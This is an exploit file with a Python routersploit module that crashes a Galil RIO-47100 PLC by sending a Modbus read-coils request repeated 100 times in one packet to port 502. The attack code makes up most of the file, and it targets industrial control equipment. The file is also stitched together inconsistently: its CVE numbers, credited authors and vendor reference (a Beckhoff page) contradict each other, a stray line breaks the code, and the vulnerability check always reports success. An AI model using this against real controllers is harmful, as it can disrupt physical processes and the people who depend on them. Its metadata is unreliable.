# Exploit Title: Galil RIO-47100
# Date: 05-01-2013
# Exploit Author: Sapling
# Vendor Homepage: www.galilmc.com
# Version: Rio Firmware Prior to 1.1d
# CVE : CVE-2013-0699
# ICSA: ICSA-13-116-01

'''/* There are many different ways to crash this PLC but most of them are
centralized around the repeating a request in a single packet format. So
read a coil repeated in a single packet.
The Rio-47100 by Galil is a small PLC with an internal RISC based
processor. It communicates using ModBus, or Telnet over Ethernet as well as
having a web server built in that allows a user to issue commands.
I take no responsibility for the use of this code and using this code you
agree to take responsibility for your own actions. */'''


# Python Proof of concept
# A quick run down of the last half start at \x06
# \x06 length
# \x01 unit id
# \x01 function code (read coils)
# \x00\x00 start address
# \x00\x01 coil quantity
# Repeat the request in the packet 100 times
# Unfortunateley I can't remember the minimum number of times you have to
#repeat to cause the crash

import sys
import socket
from routersploit.core.exploit import *
from routersploit.core.http.http_client import HTTPClient

class Exploit(HTTPClient):

    target = OptIP("", "Target IPv4 or IPv6 address")
    port = OptPort(502, "Target HTTP port")
    
    __info__ = {

        "name": "Galil RIO-47100",
        "description": "There is a vulnerability in GalilRIO-47100PocketPLC "
                       "A remote attacker can exploit this vulnerability to cause "
                       "a denial of service via a session that contains a 'repeat request'.",
        "authors": (
            "Photubias",  # vulnerability discovery
            "###",  # routersploit module
        ),
        "references": (
            "https://www.beckhoff.com/english.asp?embedded_pc/cx9020.htm",
        ),
        "devices": (
            "CVE-2018-6961"
        ),

    }
    
    def run(self):
        if self.check():
            print_success("Target seems to be vulnerable")
            try:
                new = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                new.connect((self.target, self.port)) #Change the IP address to your PLC IP
                Address
                new.send('\x00\x01\x00\x00\x00\x06\x01\x01\x00\x00\x00\x01'*100)
            except:

                print_error("Exploit failed - Connection refused")
            
        else:

            print_error("Exploit failed - target seems to be not vulnerable")
    def check(self):
        
        return True